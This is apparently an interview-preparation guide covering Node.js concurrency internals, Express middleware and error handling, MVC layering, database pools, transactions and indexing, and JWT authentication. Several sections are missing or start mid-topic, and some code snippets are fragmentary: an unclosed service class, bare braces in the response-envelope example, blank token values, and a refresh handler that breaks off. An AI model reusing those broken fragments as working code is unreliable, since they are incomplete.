1. Node.js Concurrency & Internals

Q1. What is Node.js? ***

Node.js is a JavaScript runtime built on Google's V8 engine that lets JavaScript run outside the browser — on a server, in a CLI tool, anywhere a normal OS process can run. It isn't a language and it isn't a framework; it's an execution environment: V8 actually runs the JS, and libuv plus a set of built-in modules (fs, http, path, crypto, ...) give that JS access to the filesystem, network sockets, and other OS-level capabilities a browser deliberately keeps JS sandboxed away from.

Browser JS                         Node.js
──────────────────────             ──────────────────────
V8 engine                          V8 engine
+ Web APIs (DOM, fetch, ...)       + libuv (event loop, thread pool)
sandboxed — no filesystem access   + built-in modules (fs, http, ...)
                                    full OS access

What makes it a good fit for backend/API work specifically is what the next few questions dig into: a single-threaded event loop combined with non-blocking I/O by design (Q2), and an ecosystem — npm — that's the exact same package manager and module system frontend JS already uses, letting a MERN team share language, tooling, and occasionally even code (e.g. a validation schema) between client and server.

Common follow-up: "so is Node.js single-threaded or multi-threaded?" — the JavaScript you write always runs on a single thread, but Node as a whole isn't single-threaded under the hood; libuv maintains its own thread pool for work the OS can't do asynchronously (see Q6). That distinction is exactly what the next question unpacks.

Q2. How does Node.js handle concurrency despite being single-threaded? ***

Node.js is single-threaded — one call stack, one piece of JS executing at a time. It achieves high concurrency through non-blocking I/O and the event loop, powered by libuv.

Instead of waiting for I/O (disk, network, DB), Node delegates those tasks to the OS/thread pool and continues executing other code. When I/O finishes, a callback is placed in the event queue and executed once the call stack is free.

  ┌──────────────────────────┐
  │       JavaScript         │   ← Single thread (V8 engine)
  │      (Call Stack)        │
  └────────────┬─────────────┘
               │  delegates I/O
  ┌────────────▼─────────────┐
  │         libuv            │   ← Handles async I/O, thread pool
  │  (Event Loop + OS I/O)   │
  └────────────┬─────────────┘
               │ callback when done
  ┌────────────▼─────────────┐
  │       Event Queue        │   ← Callbacks waiting to run
  └──────────────────────────┘

Analogy: a single waiter (Node.js) takes orders and passes them to the kitchen (OS/thread pool), then serves other tables instead of waiting. When food is ready, the kitchen notifies the waiter to deliver it.

Under the hood, network I/O doesn't even need the thread pool — libuv registers sockets/file descriptors with the OS's native async notification mechanism (epoll on Linux, kqueue on macOS, IOCP on Windows). The OS itself watches thousands of sockets and tells libuv which ones are ready, which is why Node can hold tens of thousands of open connections cheaply. Only APIs that lack a true async syscall (file system, DNS lookup, some crypto) get offloaded to the libuv thread pool instead.

Common follow-up: "so is Node truly single-threaded?" — no, only your JS runs on one thread; libuv's thread pool and the OS's I/O layer run in parallel underneath. Common pitfall: assuming Node is bad for all CPU work — it's fine for I/O-bound APIs but a heavy synchronous loop (image processing, big JSON.parse) will still freeze every other request because it occupies the one JS thread.

Between each phase, Node drains the microtask queue (Promises + process.nextTick).

The poll phase is the workhorse: it calculates how long to block waiting for I/O events (or returns immediately if there's already work queued), then executes callbacks for completed I/O. If there are setImmediate callbacks scheduled and the poll queue is empty, the loop won't idle in poll — it jumps straight to check. This is exactly why setImmediate inside an I/O callback always fires before a setTimeout(fn, 0) scheduled at the same point — you've just come from poll, so check runs next, before timers gets a chance in the following iteration.

Interviewers often follow up with: "what happens if a timer callback throws, or an I/O callback schedules more I/O?" — each phase fully drains its own queue (with a cap on new callbacks added during processing) and microtasks run after every single callback, not just at the end of a phase. A common pitfall is treating the event loop as one single FIFO queue — it's actually several queues serviced in a fixed phase order, plus a higher-priority microtask/nextTick layer that gets first refusal after every callback.

process.nextTick fires before Promises because it has its own dedicated "nextTick queue" drained before the microtask queue.

Crucially, microtasks aren't just drained "once per loop" — the entire nextTick + microtask queue is emptied after every single callback, even in the middle of a phase, before Node moves on to the next callback or phase. This means a chain of .then() calls that keeps scheduling more .then()s can, in principle, starve the event loop and delay I/O callbacks and timers indefinitely — a real production footgun known as microtask/nextTick starvation.

Common pitfall: recursively calling process.nextTick inside itself (e.g., in older stream implementations) can block I/O entirely, since Node won't proceed to the next phase until the nextTick queue is empty. Interviewers like to ask you to trace the exact output order of a mixed nextTick/Promise/setTimeout/setImmediate snippet — practice this until it's automatic.

The isolated memory of a process is why crashing one cluster worker doesn't take down the others — the OS enforces separate address spaces, so a segfault or unhandled exception in worker A simply can't corrupt worker B's heap. Threads trade that safety for speed: because they share memory directly, communication is just a variable read/write with no serialization cost, but that also means a bug in one thread (a bad pointer, a data race) can corrupt shared state for the whole process.

Follow-up interviewers ask: "why does Node use processes (cluster) for scaling instead of just spinning up more threads?" — because JS objects aren't safely shareable across threads without explicit serialization (structured clone via postMessage, or SharedArrayBuffer for raw bytes); processes sidestep that entirely by giving each one its own V8 instance and event loop.

Q6. What is the Libuv thread pool? What tasks use it? ***

libuv is the C library that powers Node's async I/O. It provides the event loop and a thread pool (default 4 threads, configurable via UV_THREADPOOL_SIZE).

The thread pool handles tasks that cannot be done asynchronously at the OS level (or are delegated for performance):

Uses Thread PoolDoes NOT use Thread Pool
fs (file system reads/writes)TCP/UDP networking (OS async)
crypto (hashing, encryption)HTTP requests
dns.lookup()Pipes, signals
zlib (compression)dns.resolve() (OS async)
// Uses the thread pool — doesn't block the event loop
const crypto = require('crypto');
crypto.pbkdf2('password', 'salt', 100000, 64, 'sha512', (err, key) => {
  console.log('Done hashing');
});
console.log('This runs BEFORE hashing is done');

If you fire 5 crypto.pbkdf2 calls simultaneously and pool size is 4, the 5th waits for a free thread.

Increasing UV_THREADPOOL_SIZE (up to 1024) can help throughput for fs/crypto-heavy workloads, but it must be set as an environment variable before Node starts — setting it in code after libuv has already initialized the pool has no effect. Note that on Linux, modern libuv versions can use native async file I/O (io_uring) for some fs operations, bypassing the thread pool, but this is version/platform dependent — don't assume it in interviews unless asked specifically.

Common pitfall: forgetting that DNS has two paths — dns.lookup() goes through the thread pool (and competes with fs/crypto for those same 4 threads), while dns.resolve() variants use c-ares and talk to the DNS server directly via the event loop, without touching the thread pool. A busy fs-heavy app can starve DNS lookups if it's using dns.lookup().

Q7. How does a Node server handle 1000 requests at once? ***

Via non-blocking I/O and the event loop — no new thread per request (unlike Apache/PHP).

      │
      ▼

      │
      ▼
For each request — if it needs I/O (DB query, file read):
  → Node registers the I/O operation with libuv
  → Immediately moves on to the next request
      │
      ▼
OS / thread pool performs the I/O asynchronously
      │
      ▼
When I/O completes → callback is placed in event queue
      │
      ▼
Event loop picks up the callback → sends response

Most web requests are I/O-bound. Node doesn't waste a thread waiting — it processes other requests while waiting.

Traditional server:    1000 requests → 1000 threads → high RAM, context switching
Node.js:               1000 requests → 1 thread + async I/O → low RAM, efficient

Concretely: each request's synchronous handler code (parsing params, building a query, sending the response) runs to completion in the JS thread before yielding — but the actual waiting (DB round-trip, disk read) happens off-thread via libuv/OS, so the JS thread is only ever busy for microseconds per request rather than milliseconds. This is why Node scales well for I/O-bound APIs with modest CPU per request but degrades badly the moment handlers do real computation (JSON transforms on huge payloads, synchronous crypto, image resizing) — that work monopolizes the single thread and every other one of the 1000 requests queues up behind it.

Interviewer follow-up: "what's the actual limit then?" — not thread count, but throughput of the single event loop tick plus whatever ceiling the DB/downstream service imposes; that's why horizontal scaling (cluster/PM2, multiple instances behind a load balancer) is the standard answer once one process saturates a core.

Q8. What is a blocking operation and why is it dangerous? ***

A blocking operation halts the event loop until it completes — no other code can run during that time.

// BLOCKING — stops everything
const fs = require('fs');
const data = fs.readFileSync('./large-file.txt'); // blocks event loop

// BLOCKING — CPU intensive loop
for (let i = 0; i < 1e10; i++) { /* ... */ }

// NON-BLOCKING — event loop continues
fs.readFile('./large-file.txt', (err, data) => {
  console.log(data);
});
Request 1 → triggers fs.readFileSync (blocks for 500ms)
    ↓
Request 2 → WAITS (even though it just needs "hello world")
Request 3 → WAITS
...
Request 1000 → WAITS

All 999 other users experience delay because of one blocking call. In a multi-threaded server, other threads handle other requests; in Node there's only one thread.

Blocking isn't limited to obvious sync file APIs — it also includes CPU-heavy synchronous work hidden inside a request path: large regex backtracking (ReDoS), synchronous JSON.stringify/parse on huge objects, tight loops for data transformation, or bcrypt's sync variant. All of these hold the single thread hostage exactly like fs.readFileSync does.

Detecting it in production: event loop lag/delay metrics (e.g., via perf_hooks.monitorEventLoopDelay() or APM tools) spike during blocking operations — this is usually how teams first notice the problem, since request latency alone doesn't point at the cause. Common pitfall: using JSON.parse on a very large request body synchronously in a hot route — it looks harmless but can stall the loop for hundreds of milliseconds under load.

Q9. What are clusters in Node.js and when do we use them? **

By default a Node process runs on one CPU core. Clusters spawn multiple worker processes that share the same server port, utilizing all available CPU cores.

Process vs cluster: A process is a single running instance of your application, while a cluster is a collection of multiple processes (workers) orchestrated by a primary process to share the workload across all available CPU cores.

const cluster = require('cluster');
const os = require('os');
const http = require('http');

if (cluster.isPrimary) {
  const numCPUs = os.cpus().length;
  console.log(`Primary ${process.pid} is running`);

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died`);
    cluster.fork();
  });
} else {
  http.createServer((req, res) => {
    res.end('Hello from worker ' + process.pid);
  }).listen(3000);
}

When to use: CPU-intensive apps, utilizing multi-core machines, zero-downtime restarts.

In production, use PM2 (pm2 start app.js -i max) which manages clustering automatically.

Each worker is a completely separate Node process with its own event loop, memory, and V8 heap — the primary process doesn't run application code, it just forks workers and, on Linux, uses round-robin scheduling by default to distribute incoming connections across them (on Windows the OS itself does the load balancing). Because workers don't share memory, any in-process state (in-memory cache, rate-limit counters, WebSocket connection maps) is per-worker only — a request handled by worker 2 has no visibility into worker 1's state, which is a very common gotcha when moving from a single process to a cluster.

Common pitfall: assuming clustering fixes memory leaks or blocking code — it only adds more single threads in parallel; a leak still grows per-worker, and a blocking call still stalls whichever worker got that request. Interview follow-up: "how do you share state across workers?" — externalize it to Redis or the database rather than relying on in-memory objects.

Unlike cluster/child_process.fork() (separate processes, separate V8 instances), worker threads run inside the same process and can share raw memory via SharedArrayBuffer — cheaper than IPC serialization when passing large binary buffers back and forth. Regular JS objects passed via postMessage are still structured-cloned (copied), not shared, so there's real overhead for large object graphs, just less than a full process fork.

Common pitfall: reaching for worker_threads for I/O work — since I/O is already non-blocking via libuv, adding threads there just adds complexity for no gain. They're worth the overhead only for genuinely CPU-bound work (image/video processing, large synchronous data transforms, cryptographic key generation) that would otherwise block the main event loop.

Q11. Streams — types and when to use them ***

Streams let you read/write data piece by piece (chunks) instead of loading everything into memory at once. Ideal for large files, video, real-time data.

TypeDirectionExample
ReadableRead onlyfs.createReadStream(), HTTP request
WritableWrite onlyfs.createWriteStream(), HTTP response
DuplexRead + WriteTCP socket, net.Socket
TransformRead + Write + modifyzlib.createGzip(), encryption
// BAD — loads entire file into memory
const data = fs.readFileSync('./bigfile.mp4');
res.end(data);

// GOOD — streams chunks, minimal memory usage
const readStream = fs.createReadStream('./bigfile.mp4');
readStream.pipe(res);

// Transform stream — compress on the fly
const { createReadStream, createWriteStream } = require('fs');
const { createGzip } = require('zlib');

createReadStream('input.txt')
  .pipe(createGzip())
  .pipe(createWriteStream('output.txt.gz'));

Streams operate on a fixed-size internal buffer (the highWaterMark) rather than loading the whole payload — when a writable destination is slower than the readable source, .pipe() automatically applies backpressure: it pauses the readable side once the writable's buffer fills, and resumes it once the writable emits 'drain'. Handling this manually (without .pipe()) is a classic Node bug source — writing without checking the return value of write() can balloon memory usage exactly the way streams were meant to prevent.

Interview follow-up: "why not just use .pipe() everywhere?" — for multiple destinations, error handling, or conditional branching, many production codebases now prefer the promise-based stream.pipeline() (or stream/promises) since it automatically forwards errors and cleans up streams that would otherwise leak file descriptors if you chained raw .pipe() calls yourself.

2. Express.js & MVC Architecture

Q12. What is Express.js? ***

Express is a minimal, unopinionated web framework for Node.js. It sits on top of Node's built-in http module and provides the pieces almost every server needs but Node doesn't hand you out of the box: declarative routing, a middleware pipeline, and a far thinner request/response API than writing directly against http.createServer requires.

// raw Node http — parse the URL/method and route by hand
const http = require('http');
http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/users') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify([]));
  }
}).listen(3000);

// Express — routing and response helpers built in
const express = require('express');
const app = express();
app.get('/users', (req, res) => {
  res.json([]);
});
app.listen(3000);

Express isn't part of Node itself — it's a separate npm package (npm install express) that's become the de facto standard for building REST APIs in Node precisely because it's unopinionated: it doesn't prescribe a folder structure, an ORM, or a validation library, it just supplies routing and middleware and gets out of the way. That's why layering something like MVC on top of it (Q15) is a convention a team adopts, not something Express itself enforces.

Common follow-up: "how does this differ from Nest.js?" — Nest.js is an opinionated framework that typically runs on top of Express (or Fastify) itself, adding architecture, dependency injection, and decorators Express deliberately leaves out — see the Nest.js page for that comparison in depth.

Middleware is a function with access to req, res, and next. It can execute code, modify req/res, end the request-response cycle, or call next() to pass control on.

Order matters — middleware executes in the order it's defined.

Under the hood, Express builds a linked list of handler functions per request; each middleware only advances to the next one when it explicitly calls next() — forgetting to call it (or call res.end()) leaves the request hanging forever with no response and no error, which is a very common bug for beginners. Middleware can also be scoped: app-level (app.use), router-level (express.Router()), and route-level (passed as extra arguments to app.get(path, mw1, mw2, handler)), all composing into the same chain.

Interview follow-up: "how does Express know an error-handling middleware apart from a regular one?" — purely by arity: a 4-argument function (err, req, res, next) is treated as an error handler and is only invoked when a previous middleware calls next(err) or throws (in an Express-5-aware context) — this is why the error handler must be defined with exactly 4 parameters even if you don't use all of them.

A subtlety worth knowing: app.get() is really just app.use() with a method + exact-path filter applied internally — Express's router matches methods and paths using the same underlying layer mechanism (historically path-to-regexp) for both. That's why you can mount a router with app.use('/api', router) and then define exact-match routes inside that router with router.get('/users', ...) — the prefix strips off before the inner router evaluates the remaining path.

Common pitfall: registering app.use(express.json()) after your routes — middleware registered later never runs for requests already matched by an earlier route, so the body parser must come before any route that needs req.body.

class UserService {
  static async createUser(data) {
    const hashedPassword = await bcrypt.hash(data.password, 10);
    return await User.create({ ...data, password: hashedPassword });
  }

// models/user.model.js
const userSchema = new mongoose.Schema({

  email: { type: String, unique: true },

});

The service layer is the piece teams most often skip, but it's what keeps controllers thin and testable — controllers should only translate HTTP in and out (parse req, call a service, shape the response); all business rules (validation beyond schema, calling multiple models, orchestrating a transaction) belong in services so they can be unit-tested without spinning up Express at all. Models should stay "dumb" wrappers around persistence — validation belongs at the schema level, but decisions like "can this user cancel this order" belong in services, not models.

Interview follow-up: "what goes wrong if you skip the service layer?" — controllers accumulate business logic, become impossible to unit test without mocking req/res, and logic gets duplicated across controllers that need the same operation (e.g., both a REST controller and a queue worker needing to "create a user").

Q16. Best practice for error handling in Express ***

Centralized error middleware — a single place to handle all errors consistently.

const errorHandler = (err, req, res, next) => {
  const statusCode = err.statusCode || 500;
  const message = err.message || 'Internal Server Error';

  console.error(err.stack);

  res.status(statusCode).json({
    success: false,
    error: {
      message,
      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    }
  });
};

class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true;
  }
}

throw new AppError('User not found', 404);

// app.js — MUST be last middleware
app.use(errorHandler);

Best practices: always use next(err) in async routes (or asyncHandler); distinguish operational errors from programming errors; never send stack traces in production; log errors with a logger.

The "operational vs programmer error" distinction matters more than it looks: operational errors (bad user input, failed DB connection, expired token) are expected and should return a clean 4xx/5xx JSON response and keep the process running. Programmer errors (undefined is not a function, a typo) indicate the process is in an unknown state — many teams intentionally let the process crash on these (via a top-level uncaughtException/unhandledRejection handler that logs and exits) and rely on a process manager (PM2, Kubernetes) to restart cleanly, rather than trying to keep running in a corrupted state.

Common pitfall: putting the error-handling middleware anywhere except last — Express matches middleware in registration order, so an error handler defined before your routes will never see their errors.

Q17. next(err) vs throwing errors in async Express routes ***

The synchronous way — how Express 4 expects code to run

When a route handler is synchronous, Express wraps the call in a hidden safety net and catches whatever it throws.

// Express handles this fine
app.get('/route', (req, res) => {
  throw new Error('Oops!'); // Express catches this immediately
});
  1. A request comes in.
  2. Express runs the handler function.
  3. The function throws and crashes immediately, synchronously.
  4. Express catches the crash right there and sends a 500 Internal Server Error to the client.

The asynchronous way — where Express 4 breaks

Adding async to a route handler changes what that function actually hands back to Express, and that's the whole problem.

// Express fails here
app.get('/route', async (req, res) => {
  const data = await fetchFromDatabase(); // takes 2 seconds
  throw new Error('Database failed!');
});
  1. A request comes in.
  2. Express runs the handler function.
  3. Because of async, the function immediately hands Express back a Promise — a receipt saying "I'll finish later" — instead of running to completion or throwing right away.
  4. Express sees that receipt, assumes everything's fine, and returns from the route handler call. Its synchronous try/catch is done at that point — it isn't waiting around for the promise to settle.
  5. Two seconds later, the database call resolves and the function throws.
  6. That throw rejects a promise Express already stopped watching — the try/catch that would have caught a synchronous throw is long gone, so the rejection has nowhere to go.

This is exactly an unhandled-rejection scenario: the request just hangs — nothing ever called res.json()/res.send() or next(err), so Express never sends a response — until the client's own timeout gives up. Depending on the Node version/config, that unhandled rejection can even crash the whole process.

The fixes

// Option 1: next(err) explicitly
app.get('/user', async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return next(new AppError('Not found', 404));
    res.json(user);
  } catch (err) {
    next(err);
  }
});

// Option 2: asyncHandler wrapper
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get('/user', asyncHandler(async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
}));

// Option 3: Express 5.x catches async errors automatically
// (express-async-errors polyfills this for Express 4)

Key rule: in Express 4, throw inside async functions is NOT caught — always use next(err) or asyncHandler.

Common pitfall: mixing styles inconsistently across a codebase — some routes wrapped in asyncHandler, others not — so an error in an unwrapped route silently crashes the process (via unhandledRejection) while identical bugs elsewhere are handled gracefully. Wrapping every async route consistently (or upgrading to Express 5, which catches rejected promises from async handlers automatically) removes this class of bug entirely.

Q18. Handling 404 routes cleanly ** 
// Add AFTER all valid routes, BEFORE error middleware
app.use((req, res, next) => {
  next(new AppError(`Route ${req.originalUrl} not found`, 404));
});

app.use(errorHandler);

This works because Express routers try each registered layer in order and fall through to the next if none of the earlier ones matched the path/method — by the time execution reaches this catch-all middleware, every real route has already had a chance to handle the request, so anything reaching here truly didn't match anything.

Common pitfall: placing the 404 handler before some of your routes (e.g., before a router mounted later) — it will incorrectly swallow valid requests to those later-defined routes since Express never gets that far.

Q19. Designing consistent API responses **

Consumers (frontend, mobile, other services) need a predictable structure.

}

{
  "success": false,

}

  res.status(statusCode).json({ success: true, data, message });

  res.status(statusCode).json({ success: false, error: { message } });

A consistent envelope matters most at scale: frontend/mobile clients can write one generic response interceptor instead of special-casing every endpoint's shape, and error codes (like USER_NOT_FOUND above) let clients branch on machine-readable identifiers instead of parsing human-readable messages, which is fragile once messages get localized or reworded.

Common pitfall: returning HTTP 200 with { success: false } in the body — this breaks HTTP semantics (caching, monitoring, API gateways that key off status codes) and forces every client to double-check both the status code and the body. Keep the HTTP status code as the source of truth and use the envelope for structured detail, not as a replacement for it.

Interview follow-up: "where do you store idempotency keys?" — Redis with a TTL is the standard answer, since it needs to be fast, shared across all server instances, and self-expiring.

Q23. CRUD without a DB — in-memory store, risks ** 
const store = {
  users: [],
  nextId: 1
};

function createUser(data) {
  const user = { id: store.nextId++, ...data, createdAt: new Date() };
  store.users.push(user);
  return user;
}

function getUserById(id) {
  return store.users.find(u => u.id === id) || null;
}

function updateUser(id, data) {
  const idx = store.users.findIndex(u => u.id === id);
  if (idx === -1) return null;
  store.users[idx] = { ...store.users[idx], ...data };
  return store.users[idx];
}

function deleteUser(id) {
  const idx = store.users.findIndex(u => u.id === id);
  if (idx === -1) return false;
  store.users.splice(idx, 1);
  return true;
}

Risks: data lost on restart, not scalable (each instance has its own copy), no transactions (race conditions), memory limits.

The race condition risk is easy to demonstrate concretely: two concurrent requests both read store.nextId, both increment it, and both write — under Node's single-threaded model this is actually safe as long as neither operation awaits mid-update (no interleaving is possible between two fully synchronous statements), but the moment any async work (a validation call, a fetch) is introduced between read and write, two requests can interleave and corrupt the counter or overwrite each other's array splice.

Interview follow-up: this pattern is still genuinely useful for prototyping, unit tests, and take-home interview exercises where standing up a real DB is overkill — the key is being explicit that it's a placeholder, not a production design.

Q25. What is a database connection pool and why is it needed? **

A cache of reusable database connections maintained so connections can be reused rather than establishing a new one each time.

Request 2 → Open connection → Query → Close connection

With pool (10 connections):

Why needed: opening a connection is expensive (TCP handshake, auth); web servers get burst traffic; limits max connections to the DB.

Sizing the pool matters more than people expect: too small and requests queue waiting for a free connection under load (visible as rising latency even though the DB itself isn't overloaded); too large and you can exhaust the database's own connection limit (Postgres defaults to 100 total), especially once you multiply pool size by the number of clustered app instances — 10 instances x 20-connection pools = 200 connections, which can crash a DB configured for 100.

Interview follow-up: "what happens in a serverless environment (Lambda) where each invocation might open its own pool?" — this is a known anti-pattern that can exhaust DB connections quickly; the standard fixes are a connection-pooling proxy (RDS Proxy, PgBouncer) sitting between the functions and the database, or reusing a single connection across warm invocations.

Q26. What are Models and why do we use them? ***

A Model is a class/object representing a collection (MongoDB) or table (SQL), providing methods to interact with it. The "M" in MVC.

const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, unique: true, lowercase: true },
  password: String,
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
  createdAt: { type: Date, default: Date.now }
});

userSchema.methods.comparePassword = async function(candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};

userSchema.statics.findByEmail = function(email) {
  return this.findOne({ email });
};

const User = mongoose.model('User', userSchema);

const user = await User.create({ name: 'Alice', email: 'a@a.com', password: '...' });
const found = await User.findByEmail('a@a.com');

Why models: encapsulate data structure and DB logic, validate data before saving, provide reusable query methods, keep controllers lean.

Mongoose models also give you middleware hooks (pre/post save, validate, remove) that centralize cross-cutting concerns — e.g., hashing a password in a pre('save') hook guarantees it happens no matter which code path creates a user, instead of relying on every controller to remember to hash it manually. Instance methods (comparePassword) attach behavior to a document, while statics attach behavior to the model/collection as a whole — a distinction interviewers sometimes probe directly.

Common pitfall: putting business logic (like sending a welcome email) inside a model hook — hooks are meant for data-integrity concerns tied to persistence, not side effects with their own failure modes; those belong in the service layer where they can be tested and retried independently.

Constraints both can enforce: required/NOT NULL, unique values, min/max, enum, defaults, data type enforcement, referential integrity (SQL foreign keys).

A key difference is where enforcement actually happens: Mongoose schema validation runs in the application layer (Node process) before the write reaches MongoDB, whereas SQL constraints (CHECK, NOT NULL, FOREIGN KEY) are enforced by the database engine itself, regardless of which application or script writes to it. That means a raw MongoDB write bypassing Mongoose (e.g., a script using the native driver directly) skips schema validation entirely, while no client can bypass a SQL CHECK constraint.

Interview follow-up: "so is a Mongoose schema a real guarantee?" — not a hard one; MongoDB does support server-side JSON Schema validation on collections for exactly this reason, but it's used far less often than Mongoose-level validation in practice.

Isolation is the property with the most nuance — it's implemented via isolation levels (Read Uncommitted, Read Committed, Repeatable Read, Serializable), each trading consistency for concurrency/performance. Read Committed (Postgres's default) prevents dirty reads but still allows non-repeatable reads and phantom reads within the same transaction; Serializable gives the strongest guarantee (as if transactions ran one at a time) but can force retries when conflicts are detected.

Interview follow-up: "what's a dirty read vs a phantom read?" — a dirty read is reading another transaction's uncommitted change (which might get rolled back); a phantom read is re-running the same query in one transaction and getting a different set of rows because another transaction inserted/deleted matching rows in between. Common pitfall: assuming MongoDB has "no ACID" — single-document writes have always been ACID in MongoDB, and multi-document ACID transactions have been supported since MongoDB 4.0.

Q30. What is a transaction and when is it needed? **

A transaction is a group of one or more database operations executed as a single atomic unit — either every operation in the group succeeds and the changes are committed together, or if any one of them fails, the entire group is rolled back and the database is left exactly as if none of them had run. There's no in-between state where only some of the operations took effect. That all-or-nothing guarantee is precisely what the "A" (Atomicity) in ACID (Q29) refers to.

const session = await mongoose.startSession();
session.startTransaction();
try {
  await Order.create([{ product: 'X', user: userId }], { session });
  await Product.updateOne({ _id: productId }, { $inc: { stock: -1 } }, { session });
  await session.commitTransaction();
} catch (err) {
  await session.abortTransaction();
  throw err;
} finally {
  session.endSession();
}

When needed: transferring money, creating an order + reducing inventory together, registering a user + creating a default profile, any operation where partial completion would leave data inconsistent.

In MongoDB specifically, transactions require a replica set (or sharded cluster) — they don't work on a standalone instance, which surprises people testing locally. Transactions also carry real performance cost (holding locks/snapshots across multiple operations, coordination overhead), so the common design guidance is to model documents so that operations that must be atomic together live in a single document where possible (relying on MongoDB's native single-document atomicity) and reach for multi-document transactions only when that's genuinely not feasible.

Common pitfall: forgetting to pass { session } into every operation inside the transaction — an operation that omits the session silently runs outside the transaction and won't be rolled back if the transaction later aborts.

Q31. What is indexing and how does it affect performance? **

An index is a data structure (usually a B-tree) that lets the DB find records without scanning every row/document.

// MongoDB
userSchema.index({ email: 1 });           // single field
userSchema.index({ name: 1, age: -1 });   // compound index
userSchema.index({ email: 1 }, { unique: true });

-- SQL
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at DESC);
Without IndexWith Index
Read speedO(n) — full scanO(log n) — tree traversal
Write speedFast — just insertSlower — must update index too
StorageLessMore

Index fields you frequently query/sort/filter by; don't over-index; use .explain() (MongoDB) or EXPLAIN ANALYZE (SQL) to verify index usage.

Concretely, a B-tree index keeps keys sorted in a balanced tree so the DB can binary-search down to the matching range instead of scanning every row — that's what turns an O(n) collection scan into an O(log n) lookup, and it's also why B-trees make range queries (>, <, BETWEEN) and sorted results cheap, unlike a hash index which only helps exact-match lookups. For compound indexes, field order matters — an index on { name: 1, age: -1 } can serve queries filtering on name alone, or name+age, but not on age alone (this is the "leftmost prefix" rule, true in both MongoDB and SQL B-tree indexes).

Interview follow-up: "why does an index slow down writes?" — every insert/update/delete must also update every index on the affected fields, so a table with 10 indexes pays that cost on every single write, which is why indexing is a read/write tradeoff, not a free performance win. Common pitfall: adding an index and assuming it's used — a query with a leading wildcard (LIKE '%term'), a function applied to the indexed column, or a low-cardinality field (like a boolean) often causes the planner to skip the index or do a full scan anyway; always verify with the query plan.

Q33. How do you implement authentication and authorization in Express? ***

Register and log in: hash passwords with bcrypt, never store plaintext passwords, and sign a short-lived JWT after verifying credentials.

const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const User = require('../models/User');
const router = express.Router();

router.post('/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;
    if (!name || !email || !password) {
      return res.status(400).json({ message: 'Missing required fields' });
    }
    if (await User.findOne({ email })) {
      return res.status(409).json({ message: 'User already exists' });
    }
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await User.create({ name, email, password: hashedPassword });
    return res.status(201).json({ message: 'Registered', userId: user._id });
  } catch (error) {
    // Also map a duplicate-email unique-index error to 409 in production.
    return res.status(500).json({ message: 'Server error' });
  }
});

router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Missing credentials' });
    }
    const user = await User.findOne({ email });
    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    const token = jwt.sign(
      { userId: user._id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    return res.json({ token });
  } catch (error) {
    return res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;

Protect routes: send the token as Authorization: Bearer <token>. Authentication verifies the signature and expiry; authorization checks the verified user's role.

const authenticate = (req, res, next) => {
  const header = req.headers.authorization;
  const token = header?.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Not authenticated' });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
};

const authorize = (...roles) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  next();
};

app.delete('/users/:id', authenticate, authorize('admin'), deleteUser);

Notice the two middlewares are deliberately separate and composable — authenticate only answers "is this a valid, non-expired token" and attaches req.user; authorize is a completely independent concern that reads the already-attached user and checks permissions. Keeping them separate means you can reuse authenticate alone for routes any logged-in user can hit, and layer different authorize checks (role-based, ownership-based) on top per-route.

Common pitfall: checking authorization based on data the client sent (e.g., trusting a role field in the request body) instead of the value embedded in the verified token/session — that lets any client simply claim to be an admin. Authorization must always be derived from server-verified state, never from client-supplied fields.

Production notes: enforce a unique index on email, validate input, rate-limit login, keep JWT_SECRET outside source control, and use short-lived access tokens with a refresh-token strategy when longer sessions are needed. For sensitive permissions, recheck the current role in the database so an old JWT cannot retain a revoked role until it expires.

Neither is a silver bullet; the real defense is layering (httpOnly + SameSite + short expiry + CSP) rather than picking one storage mechanism and calling it done.

Interview follow-up: "what would you actually ship in production?" — httpOnly + secure + SameSite=Strict/Lax cookies for the refresh token, paired with a short-lived access token kept only in memory (not even localStorage) on the client, refreshed silently via the cookie-backed refresh endpoint.

Q35. JWT flow (access + refresh token) end-to-end *** 
1. LOGIN
   Client → POST /auth/login { email, password }
   Server → Verifies credentials
   Server → Issues:
     • accessToken  (short-lived: 15min)
     • refreshToken (long-lived: 7 days) — httpOnly cookie + DB

2. AUTHENTICATED REQUEST
   Client → GET /api/profile
             Authorization: Bearer 
   Server → Validates signature + expiry → Returns data

3. TOKEN REFRESH (when accessToken expires)

             Cookie: refreshToken=

   Server → Issues new accessToken (optionally rotates refreshToken)

4. LOGOUT
   Client → POST /auth/logout
   Server → Deletes refreshToken from DB, clears cookies
const generateTokens = (userId) => ({
  accessToken: jwt.sign({ id: userId }, process.env.JWT_SECRET, { expiresIn: '15m' }),
  refreshToken: jwt.sign({ id: userId }, process.env.REFRESH_SECRET, { expiresIn: '7d' })
});

app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

